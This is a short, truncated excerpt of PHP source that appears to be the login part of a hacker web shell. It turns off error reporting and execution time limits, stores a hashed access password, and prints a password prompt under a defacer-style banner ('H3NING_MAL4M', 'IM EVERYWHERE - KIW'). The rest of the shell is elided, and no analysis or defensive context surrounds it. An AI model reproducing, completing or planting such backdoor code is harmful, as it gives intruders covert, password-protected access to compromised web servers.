...
set_time_limit(0);
error_reporting(0);
$auth_pass ="06ab40ab1b8aaca6ce184af98fddc3a7";
...
function Login() {
  ...
  <body>
  <br>
  <h1><center>H3NING_MAL4M</h1><br></center><center>IM EVERYWHERE - KIW</center><br><center><form method='post'><input style='text-align:center;' type='password' name='pass'></form>
 ");
}
